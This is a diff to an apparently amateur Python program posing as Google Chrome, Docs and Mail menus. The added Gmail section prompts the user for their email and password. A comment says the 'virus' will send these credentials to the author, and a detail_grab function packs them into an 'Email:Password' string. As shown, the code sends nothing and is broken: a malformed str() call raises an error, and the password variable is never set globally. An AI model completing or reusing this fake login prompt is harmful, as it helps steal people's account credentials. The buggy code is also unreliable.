@@ -4,6 +4,8 @@ import time
 import os
 
 clear = lambda: os.system("cls")
+email = None
+password = None
 
 def frontend():
     #Works with the other functions, to create the program.
@@ -60,18 +62,40 @@ def google_docs():
 
 def google_mail():
     #The 'virus' in this program will send the email and password of this person's address to my email as soon as it is obtained.
+    global email
 
-    global mode
+    email = input('Enter your email address: ')
+    password = input('Enter your password')
+
     clear()
+
+    detail_grab()
+    send_mail()
+    print('Email sent!')
+
+def send_mail():
+    #sends the real email.
+    reciever = input('Enter the email address you want to send to: ')
+    body = input('Type the whole email here: ')
+
+def detail_grab():
+    #Emails the details of the account to me.
+    global email
+    global password
+
+    message = (str('Email:Passowrd.     ', email, ':', password))
 
 
 frontend()
 
 if mode == '1':
+    clear()
     google_chrome()
 
 if mode == '2':
+    clear()
     google_docs()
 
 if mode == '3':
+    clear()
     google_mail()
